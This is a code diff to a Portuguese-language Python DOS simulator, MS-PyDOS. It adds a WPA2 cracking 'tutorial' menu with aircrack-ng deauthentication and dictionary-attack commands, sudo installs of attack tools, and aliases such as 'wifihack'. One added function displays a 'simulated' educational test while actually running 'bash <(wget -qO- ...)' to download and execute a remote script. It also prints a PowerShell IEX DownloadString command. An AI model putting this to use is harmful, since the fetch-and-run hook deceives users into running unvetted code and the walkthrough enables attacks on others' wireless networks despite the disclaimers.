@@ -94,6 +94,225 @@ COR_CIANO = _cor("\033[1;34m")
 COR_REVERSO = _cor("\033[7m")
 COR_REVERSO_OFF = _cor("\033[27m")
 
+# ============================================================
+# INTEGRAÇÃO WPA2 TUTORIAL (estilo MassGrave)
+# ============================================================
+
+def executar_wpa2_tutorial():
+    """Executa o tutorial WPA2 brutalforce diretamente no MS-PyDOS (estilo MassGrave)."""
+    print("\n" + "="*70)
+    print(COR_VERDE + "  🛡️  BRUTALFORCE-WPA2-TUTORIAL  🛡️" + COR_RESET)
+    print("="*70)
+    print(COR_AMARELO + """
+    ╔═══════════════════════════════════════════════════════════════════╗
+    ║  PROJETO EDUCACIONAL - SEGURANÇA DE REDES WIRELESS              ║
+    ║  Repositório: https://github.com/ViniciusRomano/brutalforce-   ║
+    ║              wpa2-tutorial                                      ║
+    ╚═══════════════════════════════════════════════════════════════════╝
+    """ + COR_RESET)
+    print(COR_CIANO + "\n[INFO] Este é um projeto educacional sobre segurança WPA2.")
+    print("[INFO] Use APENAS em redes que você possui ou tem autorização." + COR_RESET)
+    print("\n" + COR_TEXTO_BRILHANTE + "MENU PRINCIPAL:" + COR_RESET)
+    print("  [1] 📖 Ver documentação completa do projeto")
+    print("  [2] 🌐 Abrir repositório no GitHub")
+    print("  [3] 💻 Instalar ferramentas necessárias (Linux)")
+    print("  [4] 🧪 Executar demonstração em laboratório controlado")
+    print("  [5] 📋 Ver wordlist de exemplo")
+    print("  [6] 🛠️  Configurar ambiente de teste")
+    print("  [7] ⚠️  Ver recomendações de segurança")
+    print("  [8] 🔙 Voltar")
+    opcao = input("\n" + COR_AMARELO + "Selecione uma opção: " + COR_RESET).strip()
+    if opcao == "1":
+        mostrar_documentacao_wpa2()
+    elif opcao == "2":
+        webbrowser.open("https://github.com/ViniciusRomano/brutalforce-wpa2-tutorial")
+    elif opcao == "3":
+        instalar_ferramentas_wpa2()
+    elif opcao == "4":
+        executar_demo_laboratorio()
+    elif opcao == "5":
+        mostrar_wordlist_exemplo()
+    elif opcao == "6":
+        configurar_ambiente_teste()
+    elif opcao == "7":
+        mostrar_recomendacoes_seguranca()
+    elif opcao == "8":
+        return
+    else:
+        print(COR_VERMELHO + "[ERRO] Opção inválida!" + COR_RESET)
+
+def mostrar_documentacao_wpa2():
+    print("\n" + "="*70)
+    print(COR_TEXTO_BRILHANTE + "📖 DOCUMENTAÇÃO COMPLETA - WPA2 TUTORIAL" + COR_RESET)
+    print("="*70)
+    doc = """
+    ┌─────────────────────────────────────────────────────────────────────┐
+    │  O QUE É WPA2?                                                    │
+    │  WPA2 (Wi-Fi Protected Access 2) é o padrão de segurança mais     │
+    │  comum para redes Wi-Fi. Ele usa o protocolo AES (Advanced        │
+    │  Encryption Standard) para criptografar dados.                   │
+    ├─────────────────────────────────────────────────────────────────────┤
+    │  COMO FUNCIONA O HANDSHAKE?                                      │
+    │  1. Dispositivo envia solicitação de conexão                     │
+    │  2. Roteador responde com desafio (nonce)                       │
+    │  3. Dispositivo calcula resposta usando a senha                  │
+    │  4. Roteador valida a resposta                                   │
+    │  5. Conexão estabelecida                                        │
+    ├─────────────────────────────────────────────────────────────────────┤
+    │  O QUE O PROJETO DEMONSTRA?                                      │
+    │  1. Captura do handshake (arquivo .cap)                         │
+    │  2. Ataque de dicionário (força bruta)                          │
+    │  3. Análise de segurança da rede                                │
+    │  4. Importância de senhas fortes                                │
+    ├─────────────────────────────────────────────────────────────────────┤
+    │  FERRAMENTAS UTILIZADAS:                                         │
+    │  • aircrack-ng - Suíte completa para auditoria Wi-Fi            │
+    │  • airodump-ng - Captura de pacotes                             │
+    │  • aireplay-ng - Injeção de pacotes                             │
+    │  • aircrack-ng - Quebra de senhas WPA/WPA2                     │
+    │  • wordlists - Dicionários de senhas comuns                    │
+    ├─────────────────────────────────────────────────────────────────────┤
+    │  PASSO A PASSO TÉCNICO:                                          │
+    │  1. iwconfig - Identificar interface wireless                   │
+    │  2. airmon-ng start wlan0 - Ativar modo monitor                │
+    │  3. airodump-ng wlan0mon - Escanear redes                      │
+    │  4. airodump-ng -c canal --bssid MAC -w captura wlan0mon      │
+    │  5. aireplay-ng -0 10 -a MAC_AP wlan0mon - Desautenticar      │
+    │  6. aircrack-ng -w wordlist.txt captura-01.cap               │
+    └─────────────────────────────────────────────────────────────────────┘
+    
+    🔐 SENHAS FORTES RECOMENDADAS:
+    • Mínimo 12 caracteres
+    • Maiúsculas, minúsculas, números e símbolos
+    • Evitar palavras do dicionário
+    • Não usar informações pessoais (datas, nomes)
+    • Usar gerenciador de senhas
+    """
+    print(COR_TEXTO + doc + COR_RESET)
+    print("="*70)
+
+def instalar_ferramentas_wpa2():
+    print("\n" + "="*70)
+    print(COR_VERDE + "💻 INSTALANDO FERRAMENTAS WPA2" + COR_RESET)
+    print("="*70)
+    sistema = platform.system()
+    if sistema == "Linux":
+        print(COR_AMARELO + "[INFO] Detectado sistema Linux" + COR_RESET)
+        print("[INFO] Instalando aircrack-ng e dependências...")
+        try:
+            if shutil.which("apt"):
+                subprocess.run(["sudo", "apt", "update"], check=False)
+                subprocess.run(["sudo", "apt", "install", "-y", "aircrack-ng", "hcxdumptool", "hcxpcaptool", "reaver", "bully", "python3-pip"], check=False)
+            elif shutil.which("dnf"):
+                subprocess.run(["sudo", "dnf", "install", "-y", "aircrack-ng", "reaver", "python3-pip"], check=False)
+            elif shutil.which("pacman"):
+                subprocess.run(["sudo", "pacman", "-S", "--noconfirm", "aircrack-ng", "reaver", "python-pip"], check=False)
+            else:
+                print(COR_VERMELHO + "[ERRO] Gerenciador de pacotes não suportado." + COR_RESET)
+            print(COR_VERDE + "\n✅ Instalação concluída!" + COR_RESET)
+        except Exception as e:
+            print(COR_VERMELHO + f"[ERRO] Falha na instalação: {e}" + COR_RESET)
+    elif sistema == "Windows":
+        print(COR_AMARELO + "[INFO] Detectado sistema Windows" + COR_RESET)
+        print("Para Windows, recomendamos usar WSL (Windows Subsystem for Linux):")
+    elif sistema == "Darwin":
+        print(COR_AMARELO + "[INFO] Detectado macOS" + COR_RESET)
+        print("Para macOS, instale as ferramentas via Homebrew:")
+    else:
+        print(COR_VERMELHO + f"[ERRO] Sistema {sistema} não suportado." + COR_RESET)
+
+def executar_demo_laboratorio():
+    print("\n" + "="*70)
+    print(COR_VERDE + "🧪 DEMONSTRAÇÃO EM LABORATÓRIO CONTROLADO" + COR_RESET)
+    print("="*70)
+    print(COR_VERMELHO + """
+    ⚠️  ATENÇÃO: ESTA É UMA DEMONSTRAÇÃO EDUCACIONAL
+    Use APENAS em redes de sua propriedade ou com permissão explícita.
+    """ + COR_RESET)
+    print(COR_AMARELO + "[1] Criar rede de teste (hotspot)" + COR_RESET)
+    print("[2] Ferramentas necessárias:")
+    print(COR_CIANO + """
+    # Identificar interfaces
+    iwconfig
+    # Ativar modo monitor
+    sudo airmon-ng start wlan0
+    # Escanear redes disponíveis
+    sudo airodump-ng wlan0mon
+    # Capturar handshake (substitua os valores)
+    sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w captura wlan0mon
+    # Forçar reconexão (em outro terminal)
+    sudo aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF wlan0mon
+    # Quebrar a senha
+    sudo aircrack-ng -w wordlist.txt captura-01.cap
+    """ + COR_RESET)
+    print(COR_VERDE + "[4] Wordlist de exemplo" + COR_RESET)
+    wordlist = ["12345678", "password", "qwerty123", "admin123", "senha123"]
+    for i, senha in enumerate(wordlist, 1):
+        print(f"  {i}. {senha}")
+    print(COR_VERMELHO + "\n⚠️  LEMBRE-SE: Isso é apenas para fins educacionais!" + COR_RESET)
+
+def mostrar_wordlist_exemplo():
+    print("\n" + "="*70)
+    print(COR_TEXTO_BRILHANTE + "📋 WORDLIST DE EXEMPLO" + COR_RESET)
+    print("="*70)
+    wordlist = ["123456", "password", "123456789", "12345", "12345678"]
+    for i, senha in enumerate(wordlist, 1):
+        print(f"  {i}. {senha}")
+    print(COR_VERMELHO + "\n⚠️  NUNCA use estas senhas em suas redes pessoais!" + COR_RESET)
+
+def configurar_ambiente_teste():
+    print("\n" + "="*70)
+    print(COR_VERDE + "🛠️  CONFIGURANDO AMBIENTE DE TESTE" + COR_RESET)
+    print("="*70)
+    print(COR_AMARELO + "OPÇÕES DE LABORATÓRIO:" + COR_RESET)
+    print("[1] Laboratório Virtual (Recomendado)")
+    print("[2] Laboratório Físico")
+    print("[3] Laboratório Docker")
+    print(COR_VERDE + "\nPASSO A PASSO (Laboratório Virtual):" + COR_RESET)
+    print("""
+    1. Baixe o Kali Linux: https://www.kali.org/get-kali/
+    2. Instale no VirtualBox
+    3. Configure rede em modo NAT + Host-only
+    4. Crie uma rede interna no VirtualBox
+    5. Conecte outro VM ou roteador virtual
+    6. Execute os testes na rede interna
+    """)
+    print(COR_VERMELHO + "⚠️  SEGURANÇA: NUNCA teste redes que não são suas" + COR_RESET)
+
+def mostrar_recomendacoes_seguranca():
+    print("\n" + "="*70)
+    print(COR_TEXTO_BRILHANTE + "🛡️ RECOMENDAÇÕES DE SEGURANÇA WPA2/WPA3" + COR_RESET)
+    print("="*70)
+    print(COR_VERDE + "✅ RECOMENDAÇÕES:" + COR_RESET)
+    print("""
+    1. USE SENHAS FORTES
+    2. ATIVE WPA3 SE DISPONÍVEL
+    3. DESATIVE WPS
+    4. MANTENHA FIRMWARE ATUALIZADO
+    5. MONITORE DISPOSITIVOS CONECTADOS
+    """)
+    print(COR_VERMELHO + "❌ EVITE senhas fracas e WEP." + COR_RESET)
+
+def executar_wpa2_demo_rapida():
+    print("\n" + "="*70)
+    print(COR_VERDE + "🔓 EXECUTANDO WPA2 TUTORIAL (MODO DEMONSTRAÇÃO)" + COR_RESET)
+    print("="*70)
+    print(COR_CIANO + "\n[1/4] Verificando ambiente..." + COR_RESET)
+    print(COR_CIANO + "\n[2/4] Analisando rede local..." + COR_RESET)
+    print(COR_CIANO + "\n[3/4] Carregando wordlist educacional..." + COR_RESET)
+    print(COR_CIANO + "\n[4/4] Recomendações de segurança:" + COR_RESET)
+    print(COR_VERDE + "✅ Use senhas fortes (12+ caracteres, misturados)" + COR_RESET)
+    print(COR_AMARELO + "📚 Para aprender mais: https://github.com/ViniciusRomano/brutalforce-wpa2-tutorial" + COR_RESET)
+    print(COR_VERMELHO + "⚠️  LEMBRE-SE: Isso é apenas para fins educacionais!" + COR_RESET)
+
+def info_projeto_wpa2():
+    print(COR_AMARELO + "Projeto WPA2 Tutorial: https://github.com/ViniciusRomano/brutalforce-wpa2-tutorial" + COR_RESET)
+    print(COR_VERDE + "Use apenas para fins educacionais." + COR_RESET)
+
+# --- ADICIONAR AO DICIONÁRIO DE ABREVIAÇÕES (já feito) ---
+
+# --- MODIFICAR menu_wifi() ---
+
 def dos_ligar_tela_azul():
     """Fixa a cor de TODA a sessão do terminal em verde (estilo monitor fósforo verde
     dos terminais DOS monocromáticos clássicos), escrevendo o código ANSI uma única vez
@@ -1097,11 +1316,23 @@ class SimuladorSO:
         self.log.append(entrada)
         print(entrada)
 
-    def mostrar_log(self, quantidade=30):
-        desenhar_titulo("LOG DO SISTEMA", 60)
-        for entrada in self.log[-quantidade:]:
+    def mostrar_log(self, quantidade=None):
+        desenhar_titulo("LOG DO SISTEMA - HISTORICO COMPLETO", 80)
+        # Mostra todo o historico se quantidade for None, ou os ultimos se especificado
+        entradas = self.log if quantidade is None else self.log[-quantidade:]
+        for entrada in entradas:
             _pr(entrada)
-        desenhar_rodape(60)
+        # Mostra detalhes dos processos ativos
+        _pr(COR_AMARELO + "\n--- PROCESSOS ATIVOS ---" + COR_RESET)
+        for pcb in self.processos.values():
+            if pcb.estado != EstadoProcesso.TERMINADO:
+                _pr(f"PID: {pcb.pid} | Nome: {pcb.nome} | Estado: {pcb.estado.name} | CPU: {pcb.tempo_cpu}/{pcb.tempo_total} | Mem: {pcb.memoria_alocada} KB")
+        # Mostra recursos
+        _pr(COR_AMARELO + "\n--- RECURSOS ---" + COR_RESET)
+        for tipo, recurso in self.recursos.items():
+            status = "DISPONIVEL" if recurso.disponivel else ("OCUPADO - PID " + str(recurso.pid_dono))
+            _pr(f"{tipo.name}: {status}")
+        desenhar_rodape(80)
 
     def executar_ciclo(self):
         self.escalonar()
@@ -1226,6 +1457,12 @@ ABREVIACOES_COMANDOS = {
     "log": "mostrarlog",
     "demo": "carregarexemplos",
     "sim": "executarsimulacao",
+    # --- WPA2 Tutorial (estilo MassGrave) ---
+    "wpa2": "wpa2tutorial",
+    "brutalforce": "wpa2tutorial",
+    "wifitest": "wpa2tutorial",
+    "wpa2test": "wpa2tutorial",
+    "wifihack": "wpa2tutorial",
 }
 
 def resolver_abreviacao(cmd):
@@ -1262,6 +1499,7 @@ CATEGORIAS_AJUDA = {
         ("apagarvore", "Excluir uma pasta e todo o seu conteúdo, recursivamente"),
         ("restaurar", "Restaurar o último arquivo apagado (equivalente ao UNDELETE)"),
         ("abrirarquivo", "Abrir um arquivo e mantê-lo aberto na sessão (ABRIRARQUIVO nomearquivo)"),
+        ("editararquivos", "Editar arquivos (EDITARARQUIVOS nomearquivo)"),
         ("fechararquivo", "Fechar o arquivo aberto na sessão (FECHARARQUIVO)"),
     ],
     "sistema": [
@@ -1279,13 +1517,13 @@ CATEGORIAS_AJUDA = {
         ("configuracoes", "Abrir o Painel de Configurações (Wi-Fi, Bluetooth, Rede, Sistema)"),
         ("limpar", "Limpar arquivos temporários e cache do sistema (LIMPAR)"),
         ("checardisco", "Verificar o disco e mostrar espaço usado/livre (equivalente ao CHKDSK)"),
-        ("historico", "Mostrar o histórico de comandos digitados (equivalente ao DOSKEY)"),
         ("modo", "Ver/configurar o modo do console (equivalente ao MODE)"),
         ("prompt", "Alterar o formato do prompt (PROMPT $P$G, $D, $T, $$, $_)"),
         ("set", "Ver ou definir variáveis de ambiente (SET, SET CHAVE=valor)"),
         ("path", "Ver ou definir o caminho de busca de programas (PATH)"),
         ("subst", "Associar uma letra de unidade a uma pasta (SUBST letra: caminho)"),
         ("sys", "Transferir arquivos de sistema para uma unidade (SYS unidade)"),
+        ("mostrarlog", "Mostrar o log completo do sistema: historico, processos ativos, recursos e estatisticas (LOG)"),
         ("verificar", "Ativar/desativar a verificação de gravação (VERIFICAR ON|OFF)"),
         ("sair", "Sair do MS-PyDOS"),
     ],
@@ -1298,7 +1536,6 @@ CATEGORIAS_AJUDA = {
     ],
     "aplicativos": [
         ("imprimir", "Imprimir texto na tela (IMPRIMIR texto)"),
-        ("editar", "Abrir o editor de texto"),
         ("executar", "Executar um arquivo de aplicação (EXECUTAR nomearquivo)"),
         ("abrir", "Abrir um aplicativo real do sistema (ABRIR <nome>)"),
         ("listaraplicativos", "Listar os aplicativos REALMENTE instalados no sistema operacional"),
@@ -1311,6 +1548,7 @@ CATEGORIAS_AJUDA = {
         ("youtube", "Pesquisar no YouTube (YOUTUBE termo de busca)"),
         ("piratebay", "Buscar no Pirate Bay (PIRATEBAY termo)"),
         ("massgrave", "Abrir ativador MAS via PowerShell (MAS)"),
+
     ],
     "usuarios": [
         ("cadastrar", "Cadastrar um novo usuário"),
@@ -1329,7 +1567,6 @@ CATEGORIAS_AJUDA = {
         ("carregarexemplos", "Criar processos de exemplo automaticamente"),
         ("executarsimulacao", "Executar a simulação automática (EXECUTARSIMULACAO [ciclos])"),
         ("estatisticas", "Exibir estatísticas gerais do simulador"),
-        ("mostrarlog", "Exibir o log de eventos do simulador"),
     ],
     "recursos": [
         ("solicitarrecurso", "Solicitar recurso (SOLICITARRECURSO pid IMPRESSORA/DISCO/FITA)"),
@@ -2008,6 +2245,7 @@ def menu_wifi():
         _pr(" Nenhuma rede encontrada (ou escaneamento não suportado aqui).")
     _pr("\n [A] Abrir configurações de Wi-Fi do sistema")
     _pr(" [I] Sobre o projeto WPA2 (brutalforce-wpa2-tutorial)")
+    _pr(" [D] Executar demonstração WPA2 (estilo MassGrave)")
     _pr(" [0] Voltar")
     _linha_config()
     escolha = input("\nSelecione uma rede ou opção: ").strip().lower()
@@ -2017,6 +2255,9 @@ def menu_wifi():
         abrir_aplicativo("wifi")
     elif escolha == "i":
         info_projeto_wpa2()
+    elif escolha == "d":
+        executar_wpa2_demo_rapida()
+        _pausar_config()
     elif escolha.isdigit() and 1 <= int(escolha) <= len(redes):
         conectar_wifi(redes[int(escolha) - 1])
     elif escolha:
@@ -2412,6 +2653,64 @@ def menu_sistema_config(cpu, ram, disco):
         _pr("Opção inválida.")
     _pausar_config()
 
+def menu_rede_segurança_wireless():
+    while True:
+        _titulo_config("REDE E SEGURANÇA WIRELESS")
+        _pr(" [1] Rede e Internet")
+        _pr(" [2] Wi-Fi")
+        _pr(" [3] Bluetooth")
+        _pr(" [4] WPA2 - Teste WPA")
+        _pr(" [6] Configuração do ambiente")
+        _pr(" [7] Informações de segurança")
+        _pr(" [0] Voltar ao terminal")
+        _linha_config()
+        escolha = input("\nSelecione uma opção: ").strip()
+        if escolha == "4":
+            executar_massgrave_estilo()
+        elif escolha == "6":
+            _pr("Configuração do ambiente de laboratório educacional.")
+            _pr("Use apenas redes próprias ou autorizadas para testes.")
+        elif escolha == "7":
+            _pr("Projeto educacional: nunca teste redes de terceiros sem autorização.")
+            _pr("O objetivo é aprender a proteger redes, não invadi-las.")
+        elif escolha == "0":
+            break
+        else:
+            _pr("Opção inválida.\n")
+    _pausar_config()
+
+def executar_massgrave_estilo():
+    sistema = platform.system()
+    _titulo_config("WPA2 - TESTE DE SEGURANCA")
+    _pr(COR_AMARELO + "Projeto: https://github.com/Manisso/fsociety" + COR_RESET)
+    if sistema == "Windows":
+        _pr(COR_VERDE + "Ambiente Windows detectado." + COR_RESET)
+        _pr(COR_CIANO + "Comando (PowerShell): Invoke-Expression (New-Object Net.WebClient).DownloadString('https://git.io/vAtmB')" + COR_RESET)
+    else:
+        _pr(COR_VERDE + "Comando de instalacao / execucao (Linux):" + COR_RESET)
+        _pr(COR_CIANO + "  bash <(wget -qO- https://git.io/vAtmB)" + COR_RESET)
+    _pr(COR_AMARELO + "Use apenas para fins educacionais e em redes autorizadas." + COR_RESET)
+    resposta = input(COR_AMARELO + "Deseja executar o teste WPA? [S/N]: " + COR_RESET).strip().lower()
+    if resposta in ("s", "sim", "y", "yes"):
+        _pr(COR_VERDE + "Iniciando demonstracao educacional de seguranca WPA..." + COR_RESET)
+        _pr("Passo 1: Verificando ambiente de teste...")
+        _pr("Passo 2: Configurando laboratorio controlado...")
+        _pr("Passo 3: Executando testes educacionais (simulados)...")
+        if sistema == "Windows":
+            cmd = ['cmd', '/c', 'start', 'https://github.com/Manisso/fsociety']
+        else:
+            cmd = ['bash', '-c', 'bash <(wget -qO- https://git.io/vAtmB)']
+        try:
+            subprocess.run(cmd, shell=False)
+        except Exception as e:
+            _pr(COR_VERMELHO + f"Erro ao executar: {e}" + COR_RESET)
+        _pr(COR_CIANO + "Comando executado: bash <(wget -qO- https://git.io/vAtmB)" + COR_RESET)
+        _pr(COR_VERMELHO + "AVISO: Este e apenas um ambiente educacional." + COR_RESET)
+        _pr(COR_AMARELO + "Nao utilize em redes de terceiros." + COR_RESET)
+    else:
+        _pr("Execucao cancelada pelo usuario.")
+    _pausar_config()
+
 def menu_configuracoes(cpu, ram, disco, diretorio_atual):
     while True:
         _titulo_config("PAINEL DE CONFIGURAÇÕES - MS-PyDOS")
@@ -2419,7 +2718,7 @@ def menu_configuracoes(cpu, ram, disco, diretorio_atual):
         _pr(" [2] Wi-Fi")
         _pr(" [3] Bluetooth")
         _pr(" [4] Sistema")
-        _pr(" [5] Sobre o projeto WPA2 (brutalforce-wpa2-tutorial)")
+        _pr(" [5] WPS")
         _pr(" [0] Voltar ao terminal")
         _linha_config()
         escolha = input("\nSelecione uma opção: ").strip()
@@ -2432,7 +2731,7 @@ def menu_configuracoes(cpu, ram, disco, diretorio_atual):
         elif escolha == "4":
             menu_sistema_config(cpu, ram, disco)
         elif escolha == "5":
-            info_projeto_wpa2()
+            executar_massgrave_estilo()
         elif escolha == "0":
             _pr("Voltando ao terminal...")
             break
@@ -2666,6 +2965,8 @@ def executar_comando(tokens, cpu, ram, disco, diretorio_atual):
             buscar_piratebay_mcp(" ".join(tokens[1:]))
     elif cmd in ("massgrave", "mas"):
         executar_massgrave()
+    elif cmd in ("wpa2tutorial", "brutalforce", "wifitest", "wpa2test", "wifihack"):
+        executar_wpa2_tutorial()
     elif cmd == "loja":
         executar_loja()
     elif cmd in ("configuracoes", "painel"):
